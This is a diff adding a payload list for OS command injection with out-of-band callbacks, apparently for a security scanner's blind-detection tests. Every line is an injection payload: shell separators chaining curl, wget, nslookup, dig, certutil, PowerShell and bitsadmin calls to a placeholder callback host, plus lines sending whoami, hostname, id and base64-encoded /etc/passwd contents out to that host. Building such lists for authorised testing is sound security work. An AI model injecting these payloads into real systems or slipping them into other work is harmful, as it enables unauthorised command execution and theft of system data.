@@ -1,0 +1,92 @@
+# OS Command Injection - Out-of-Band (OOB) Payloads
+# Used for blind detection via external callbacks
+# Replace {CALLBACK_URL} and {CALLBACK_HOST} with actual values
+
+# Unix HTTP callbacks (curl)
+;curl {CALLBACK_URL}
+|curl {CALLBACK_URL}
+||curl {CALLBACK_URL}
+&&curl {CALLBACK_URL}
+$(curl {CALLBACK_URL})
+`curl {CALLBACK_URL}`
+;curl -s {CALLBACK_URL}
+;curl -k {CALLBACK_URL}
+;curl --silent {CALLBACK_URL}
+
+# Unix HTTP callbacks (wget)
+;wget {CALLBACK_URL}
+|wget {CALLBACK_URL}
+||wget {CALLBACK_URL}
+&&wget {CALLBACK_URL}
+$(wget {CALLBACK_URL})
+`wget {CALLBACK_URL}`
+;wget -q {CALLBACK_URL}
+;wget -O /dev/null {CALLBACK_URL}
+;wget --quiet {CALLBACK_URL}
+
+# Unix DNS callbacks (nslookup)
+;nslookup {CALLBACK_HOST}
+|nslookup {CALLBACK_HOST}
+||nslookup {CALLBACK_HOST}
+&&nslookup {CALLBACK_HOST}
+$(nslookup {CALLBACK_HOST})
+`nslookup {CALLBACK_HOST}`
+
+# Unix DNS callbacks (dig)
+;dig {CALLBACK_HOST}
+|dig {CALLBACK_HOST}
+||dig {CALLBACK_HOST}
+&&dig {CALLBACK_HOST}
+$(dig {CALLBACK_HOST})
+`dig {CALLBACK_HOST}`
+
+# Unix DNS callbacks (host)
+;host {CALLBACK_HOST}
+|host {CALLBACK_HOST}
+||host {CALLBACK_HOST}
+&&host {CALLBACK_HOST}
+
+# Windows HTTP callbacks (certutil)
+&certutil -urlcache -f {CALLBACK_URL} NUL
+|certutil -urlcache -f {CALLBACK_URL} NUL
+||certutil -urlcache -f {CALLBACK_URL} NUL
+&&certutil -urlcache -f {CALLBACK_URL} NUL
+
+# Windows HTTP callbacks (powershell)
+&powershell Invoke-WebRequest {CALLBACK_URL}
+|powershell Invoke-WebRequest {CALLBACK_URL}
+&powershell (New-Object Net.WebClient).DownloadString('{CALLBACK_URL}')
+|powershell (New-Object Net.WebClient).DownloadString('{CALLBACK_URL}')
+&powershell wget {CALLBACK_URL}
+|powershell curl {CALLBACK_URL}
+
+# Windows DNS callbacks (nslookup)
+&nslookup {CALLBACK_HOST}
+|nslookup {CALLBACK_HOST}
+||nslookup {CALLBACK_HOST}
+&&nslookup {CALLBACK_HOST}
+
+# Windows bitsadmin
+&bitsadmin /transfer job {CALLBACK_URL} NUL
+|bitsadmin /transfer job {CALLBACK_URL} NUL
+
+# Data exfiltration via callback
+;curl {CALLBACK_URL}?data=$(whoami)
+;curl {CALLBACK_URL}?data=$(hostname)
+;curl {CALLBACK_URL}?data=$(id)
+|wget "{CALLBACK_URL}?data=$(whoami)"
+;nslookup $(whoami).{CALLBACK_HOST}
+;nslookup $(hostname).{CALLBACK_HOST}
+&nslookup %username%.{CALLBACK_HOST}
+&nslookup %computername%.{CALLBACK_HOST}
+
+# Base64 encoded exfiltration
+;curl {CALLBACK_URL}?data=$(whoami|base64)
+;curl {CALLBACK_URL}?data=$(cat /etc/passwd|base64|head -c 100)
+;wget "{CALLBACK_URL}?data=$(id|base64)"
+
+# With quote escaping
+';curl {CALLBACK_URL};'
+";curl {CALLBACK_URL};"
+' || curl {CALLBACK_URL} || '
+" || wget {CALLBACK_URL} || "
